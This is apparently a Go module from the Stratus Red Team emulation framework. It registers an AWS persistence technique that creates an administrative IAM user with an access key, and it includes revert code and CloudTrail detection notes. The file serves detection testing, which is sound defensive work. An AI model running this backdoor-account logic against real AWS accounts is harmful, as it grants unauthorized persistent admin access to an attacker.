package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/iam/types"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

var userName = aws.String("malicious-iam-user")
var adminPolicyArn = aws.String("arn:aws:iam::aws:policy/AdministratorAccess")

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.iam-create-admin-user",
		FriendlyName: "Create an administrative IAM User",
		Description: `
Establishes persistence by creating a new IAM user with administrative permissions.

Warm-up: None.

Detonation: 

- Create the IAM user and attach the 'AdministratorAccess' managed IAM policy to it.

References:

- https://permiso.io/blog/s/approach-to-detection-androxgh0st-greenbot-persistence/
- https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor/
- https://blog.darklab.hk/2021/07/06/trouble-in-paradise/
- https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/
`,
		Detection: `
Through CloudTrail's <code>CreateUser</code>, <code>AttachUserPolicy</code> and <code>CreateAccessKey</code> events.

While matching on these events may be impractical and prone to false positives in most environments, the following
can help to craft more precise detections:

- Identify a call to <code>CreateUser</code> closely followed by <code>AttachUserPolicy</code> with an administrator policy.

- Identify a call to <code>CreateUser</code> resulting in an access denied error.
`,
		Platform:           stratus.AWS,
		IsIdempotent:       false, // cannot create twice an IAM user with the same name
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Detonate:           detonate,
		Revert:             revert,
	})
}

func detonate(_ map[string]string, providers stratus.CloudProviders) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Creating a malicious IAM user")
	_, err := iamClient.CreateUser(context.Background(), &iam.CreateUserInput{
		UserName: userName,
		Tags: []types.Tag{
			{Key: aws.String("StratusRedTeam"), Value: aws.String("true")},
		},
	})
	if err != nil {
		return err
	}

	log.Println("Attaching an administrative IAM policy to the malicious IAM user")
	_, err = iamClient.AttachUserPolicy(context.Background(), &iam.AttachUserPolicyInput{
		UserName:  userName,
		PolicyArn: adminPolicyArn,
	})
	if err != nil {
		return err
	}

	log.Println("Creating an access key for the IAM user")
	result, err := iamClient.CreateAccessKey(context.Background(), &iam.CreateAccessKeyInput{
		UserName: userName,
	})
	if err != nil {
		return err
	}

	log.Println("Created access key " + *result.AccessKey.AccessKeyId)

	return nil
}

func revert(_ map[string]string, providers stratus.CloudProviders) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())

	result, err := iamClient.ListAccessKeys(context.Background(), &iam.ListAccessKeysInput{
		UserName: userName,
	})
	if err != nil {
		return errors.New("unable to clean up IAM user access keys: " + err.Error())
	}

	for i := range result.AccessKeyMetadata {
		accessKeyId := result.AccessKeyMetadata[i].AccessKeyId
		_, err := iamClient.DeleteAccessKey(context.Background(), &iam.DeleteAccessKeyInput{
			UserName:    userName,
			AccessKeyId: accessKeyId,
		})
		if err != nil {
			return errors.New("unable to remove IAM user access key " + *accessKeyId + ": " + err.Error())
		}
		log.Println("Removed access key " + *accessKeyId)
	}

	log.Println("Detaching administrative policy")
	_, err = iamClient.DetachUserPolicy(context.Background(), &iam.DetachUserPolicyInput{
		UserName:  userName,
		PolicyArn: adminPolicyArn,
	})
	if err != nil {
		return err
	}

	log.Println("Removing IAM user")
	_, err = iamClient.DeleteUser(context.Background(), &iam.DeleteUserInput{UserName: userName})
	return err
}
